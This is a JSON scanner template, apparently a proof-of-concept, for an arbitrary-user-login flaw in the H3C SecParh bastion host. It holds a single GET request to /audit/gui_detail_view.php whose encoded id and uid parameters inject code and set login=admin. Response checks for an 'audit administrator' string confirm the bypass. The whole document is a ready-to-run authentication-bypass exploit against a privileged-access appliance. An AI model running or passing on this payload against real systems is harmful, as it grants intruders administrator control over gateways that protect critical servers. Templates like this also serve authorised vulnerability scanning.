{
    "Name": "H3C SecParh堡垒机任意用户登录",
    "Description": "H3C SecParh堡垒机任意用户登录",
    "Product": "H3C",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "错误的id"
                }, {
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "审计管理员"
                    },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}

